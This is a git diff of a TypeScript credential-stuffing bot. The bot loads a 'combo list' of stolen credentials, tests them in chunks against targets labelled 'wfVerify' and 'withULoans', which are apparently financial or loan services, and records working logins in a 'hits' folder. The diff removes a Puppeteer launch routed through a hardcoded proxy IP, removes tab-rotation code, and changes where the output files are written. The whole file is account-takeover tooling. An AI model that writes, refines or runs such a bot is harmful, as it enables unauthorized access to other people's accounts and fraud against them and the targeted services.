@@ -1,4 +1,3 @@
-import pupeeteer, { Page } from 'puppeteer';
 import fs from 'fs';
 import path from 'path';
 import chunk from 'lodash/chunk';
@@ -16,32 +15,18 @@ const GROUP_PER_PARTIAL_CREDENTIAL = 1;
 
 const CHANGE_TABS_SECONDS = 3;
 
-const BLANK_PAGE_URL = 'about:blank';
+const HITS_FOLDER = 'hits';
 
-export const HEADLESS = 'new';
-// export const HEADLESS = false;
-
-export const proxyConfig = {
-  host: '169.197.82.58',
-  port: 27211,
-};
+const HITS_FULL_DIRECTORY = `/data/${HITS_FOLDER}`;
 
 export const runWebScraping = async (
   time: string,
   comboListFileName: string,
 ) => {
-  const browser = await pupeeteer.launch({
-    headless: HEADLESS,
-    // headless: false,
-    args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
-  });
-
   try {
     const credentials = await getCredentials(comboListFileName);
 
     console.log(credentials.slice(0, 10));
-
-    // return;
 
     const partialCredentialsChunkSize = 1000;
 
@@ -76,37 +61,6 @@ export const runWebScraping = async (
      * END LOGS for combo list informations
      */
 
-    let lastPageSelectedIndex = 0;
-
-    const intervalChangeTabs = !HEADLESS
-      ? setInterval(async () => {
-          const pages: Page[] = await browser.pages();
-          const pagesWithoutEmpty: Page[] = pages.filter(
-            (page) => page.url() !== BLANK_PAGE_URL,
-          );
-
-          if (lastPageSelectedIndex >= pagesWithoutEmpty.length) {
-            lastPageSelectedIndex = 0;
-          }
-
-          let currentPage = pagesWithoutEmpty[lastPageSelectedIndex];
-
-          if (currentPage) {
-            console.log(`pages quantity: ${pagesWithoutEmpty.length}`);
-
-            currentPage.bringToFront();
-
-            console.log(
-              `bringToFront applied to page with URL: ${currentPage.url()} TAB_INDEX: ${
-                lastPageSelectedIndex + 1
-              }`,
-            );
-          }
-
-          lastPageSelectedIndex++;
-        }, CHANGE_TABS_SECONDS * 1000)
-      : undefined;
-
     logger.warn('STARTING BOT...');
 
     for (let index = 0; index < partialCredentials.length; index++) {
@@ -131,7 +85,13 @@ export const runWebScraping = async (
         credentials.length,
       )}] INVALID ${time}`;
 
-      const validFileDirectory = path.join(`${__dirname}/data/combo-lists`);
+      const dirname = process.cwd();
+
+      const validFileDirectory = path.join(`${dirname}${HITS_FULL_DIRECTORY}`);
+
+      const invalidFileDirectory = path.join(
+        `${dirname}${HITS_FULL_DIRECTORY}`,
+      );
 
       if (!fs.existsSync(validFileDirectory)) {
         fs.mkdirSync(validFileDirectory, { recursive: true });
@@ -143,7 +103,7 @@ export const runWebScraping = async (
       );
 
       const invalidFilePath = path.join(
-        `${__dirname}/data/combo-lists`,
+        invalidFileDirectory,
         `${invalidFileNameRange}${FILE_EXTENSION}`,
       );
 
@@ -193,21 +153,12 @@ export const runWebScraping = async (
             credentialChunk.map(async (credential) => {
               await Promise.all([
                 getCredentialInformationScrapper(
-                  browser,
                   credential,
                   validWriteLineOnFile,
                   invalidWriteLineOnFile,
                   validFileNameRange,
                   'wfVerify',
                 ),
-                // getCredentialInformationScrapper(
-                //   browser,
-                //   credential,
-                //   validWriteLineOnFile,
-                //   invalidWriteLineOnFile,
-                //   validFileNameRange,
-                //   'withULoans',
-                // ),
               ]);
             }),
           );
@@ -216,15 +167,9 @@ export const runWebScraping = async (
         }
       }
     }
-
-    if (intervalChangeTabs) {
-      clearInterval(intervalChangeTabs);
-    }
   } catch (error) {
     logger.error(`ERROR ON HEAD WEB SCRAPING: ${error}`);
 
     console.error(error);
-
-    await browser.close();
   }
 };
